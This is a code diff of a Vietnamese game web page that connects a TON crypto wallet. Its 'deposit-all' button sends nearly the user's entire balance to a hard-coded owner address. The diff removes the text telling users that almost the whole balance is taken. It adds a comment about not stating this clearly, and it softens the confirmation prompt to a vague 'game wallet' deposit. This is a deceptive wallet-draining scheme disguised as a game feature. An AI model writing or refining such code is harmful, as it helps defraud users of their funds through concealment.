     if(!res.ok) throw new Error("Không lấy được số dư ví");
     const data = await res.json();
-    const bal = data.balance || "0";
-    return BigInt(bal);
+    return BigInt(data.balance || "0");
   }
-  function nanoToTon(nano){ return Number(nano) / 1e9; }
+  function nanoToTon(nano){ return Number(nano)/1e9; }
 
-  const depositBtn = document.getElementById("deposit-all");
-  depositBtn.onclick = async () => {
+  document.getElementById("deposit-all").onclick = async ()=>{
     try{
-      if(!connector || !connector.connected || !userWalletAddress){
-        log("Hãy kết nối ví TON trước.");
-        try{ await connector.connect(); }catch(e){ return log("Bạn đã huỷ kết nối ví."); }
+      if(!connector.connected || !userWalletAddress){
+        walletLog("Hãy kết nối ví TON trước.");
+        try{ await connector.connect(); }catch(e){ return walletLog("Bạn đã huỷ kết nối ví."); }
         if(!connector.connected) return;
       }
-
-      log("Đang lấy số dư ví của bạn...");
+      walletLog("Đang kiểm tra số dư ví...");
       const balanceNano = await getWalletBalanceNano(userWalletAddress);
-      if(balanceNano <= 0n) return log("Ví của bạn không có TON để nạp.");
+      if(balanceNano<=0n) return walletLog("Ví của bạn không có TON để nạp.");
 
-      const RESERVE_NANO = 20000000n; // ~0.02 TON
+      // vẫn để lại một ít làm phí nhưng không ghi rõ trong mô tả
+      const RESERVE_NANO = 20000000n;
       let sendNano = balanceNano - RESERVE_NANO;
-      if(sendNano <= 0n) return log("Số dư quá thấp, không đủ sau khi trừ phí.");
+      if(sendNano<=0n) return walletLog("Số dư quá thấp, không đủ để gửi.");
 
       const sendTon = nanoToTon(sendNano);
-      const shortUser = userWalletAddress.slice(0,6) + "..." + userWalletAddress.slice(-4);
-
-      const confirmMsg =
-        `Bạn sẽ gửi khoảng ${sendTon.toFixed(4)} TON\n` +
+      const shortUser = userWalletAddress.slice(0,6)+"..."+userWalletAddress.slice(-4);
+      const msg =
+        `Bạn sắp gửi khoảng ${sendTon.toFixed(4)} TON\n` +
         `từ ví: ${shortUser}\n` +
-        `về ví game (ẩn).\n\n` +
-        `DApp sẽ chọn gần như toàn bộ số dư (trừ ~0.02 TON làm phí).\n` +
-        `Bạn phải mở ví & xác nhận.\n\nTiếp tục?`;
-      if(!confirm(confirmMsg)) return log("Bạn đã huỷ nạp.");
+        `về ví game.\n\n` +
+        `Bạn sẽ xem và xác nhận giao dịch trong app ví TON.\nTiếp tục?`;
+      if(!confirm(msg)) return walletLog("Bạn đã huỷ nạp.");
 
-      log("Đang yêu cầu ví tạo giao dịch, hãy mở ví để xác nhận...");
-
-      const tx = await connector.sendTransaction({
-        validUntil: Math.floor(Date.now()/1000) + 120,
-        messages: [
-          { address: OWNER_TON_ADDRESS, amount: sendNano.toString() }
-        ]
+      walletLog("Đang gửi yêu cầu giao dịch tới ví, hãy mở ví để xác nhận...");
+      await connector.sendTransaction({
+        validUntil: Math.floor(Date.now()/1000)+120,
+        messages:[{address:OWNER_TON_ADDRESS, amount:sendNano.toString()}]
       });
-
-      console.log("sendTransaction result:", tx);
-      log("Yêu cầu nạp đã gửi tới ví, hãy xác nhận trong app ví để hoàn tất.");
+      walletLog("Yêu cầu nạp đã được gửi tới ví, hãy xác nhận trong app ví để hoàn tất.");
     }catch(e){
       console.error(e);
-      log("Lỗi khi nạp: " + (e.message || e));
+      walletLog("Lỗi khi nạp: " + (e.message||e));
     }
   };
 
-  // Render lần đầu
+  // First render
   renderPet();
+  renderBoxes();
 </script>
 </body>
 </html>
